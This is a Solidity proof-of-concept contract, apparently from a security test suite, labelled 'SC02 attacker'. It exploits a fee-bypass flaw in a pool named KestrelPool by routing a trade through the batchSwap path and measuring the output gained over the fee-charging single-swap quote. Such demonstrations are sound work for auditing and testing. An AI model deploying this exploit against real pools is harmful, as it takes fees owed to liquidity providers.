// SPDX-License-Identifier: MIT
pragma solidity 0.8.37;

import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import { KestrelPool } from "kestrel/KestrelPool.sol";

/// @notice SC02 attacker: routes a trade through the batch path instead of {KestrelPool.swap}
///         and keeps the difference between the batch output and the single-swap quote.
contract FeeBypassAttacker {
    /// @notice Target pool.
    KestrelPool public immutable pool;

    /// @param _pool Target pool.
    constructor(KestrelPool _pool) {
        pool = _pool;
    }

    /// @notice Trade `amountIn` of `tokenIn` for `tokenOut` through the batch path.
    /// @param tokenIn Token sold (held by this contract).
    /// @param tokenOut Token bought.
    /// @param amountIn Input amount.
    /// @return quoted Output the fee-charging single path would have paid.
    /// @return received Output the batch path paid.
    function run(address tokenIn, address tokenOut, uint256 amountIn)
        external
        returns (uint256 quoted, uint256 received)
    {
        quoted = pool.getAmountOut(tokenIn, amountIn);
        IERC20(tokenIn).approve(address(pool), amountIn);
        address[] memory assets = new address[](2);
        assets[0] = tokenIn;
        assets[1] = tokenOut;
        KestrelPool.BatchStep[] memory steps = new KestrelPool.BatchStep[](1);
        steps[0] = KestrelPool.BatchStep({ assetInIndex: 0, assetOutIndex: 1, amountIn: amountIn });
        uint256 before = IERC20(tokenOut).balanceOf(address(this));
        pool.batchSwap(assets, steps, address(this));
        received = IERC20(tokenOut).balanceOf(address(this)) - before;
    }
}
